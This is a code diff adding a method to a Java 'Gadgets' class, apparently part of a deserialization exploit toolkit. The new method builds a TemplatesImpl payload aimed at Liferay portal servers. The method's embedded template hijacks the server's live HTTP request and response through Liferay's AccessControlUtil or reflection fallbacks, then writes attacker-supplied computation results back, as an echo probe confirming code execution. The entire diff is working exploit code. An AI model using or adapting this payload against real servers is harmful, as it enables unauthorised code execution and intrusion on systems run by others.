@@ -117,6 +117,31 @@ public class Gadgets {
             "        }";
         return createTemplatesImpl(command, template);
     }
+
+    public static Object createTemplatesImplLiferayEcho(final String command) throws Exception {
+        String template = "try {\n" +
+            "            javax.servlet.http.HttpServletResponse httpServletResponse;\n" +
+            "            javax.servlet.http.HttpServletRequest httpServletRequest;\n" +
+            "            try{\n" +
+            "                Class.forName(\"com.liferay.portal.kernel.security.access.control.AccessControlUtil\");\n" +
+            "                httpServletResponse = com.liferay.portal.kernel.security.access.control.AccessControlUtil.getAccessControlContext().getResponse();\n" +
+            "                httpServletRequest = com.liferay.portal.kernel.security.access.control.AccessControlUtil.getAccessControlContext().getRequest();\n" +
+            "            }catch (ClassNotFoundException e){\n" +
+            "                java.lang.reflect.Method method = Class.forName(\"com.liferay.portal.security.ac.AccessControlUtil\").getMethod(\"getAccessControlContext\",null);\n" +
+            "                java.lang.reflect.Method getResponse = Class.forName(\"com.liferay.portal.security.auth.AccessControlContext\").getMethod(\"getResponse\",null);\n" +
+            "                java.lang.reflect.Method getRequest = Class.forName(\"com.liferay.portal.security.auth.AccessControlContext\").getMethod(\"getRequest\",null);\n" +
+            "                httpServletResponse = (javax.servlet.http.HttpServletResponse)getResponse.invoke(method.invoke(null,null),null);\n" +
+            "                httpServletRequest = (javax.servlet.http.HttpServletRequest)getRequest.invoke(method.invoke(null,null),null);\n" +
+            "            }\n" +
+            "            java.io.Writer writer = httpServletResponse.getWriter();\n" +
+            "            int result = Integer.valueOf(httpServletRequest.getParameter(\"a\")).intValue()+Integer.valueOf(httpServletRequest.getParameter(\"b\")).intValue();\n" +
+            "            writer.write(String.valueOf(result));\n" +
+            "            writer.flush();\n" +
+            "        }catch (Exception e){\n" +
+            "        }";
+        return createTemplatesImpl(command, template);
+    }
+
     public static Object createTemplatesImplTomcatEcho2(final String command) throws Exception {
 
         String template = "try {\n" +
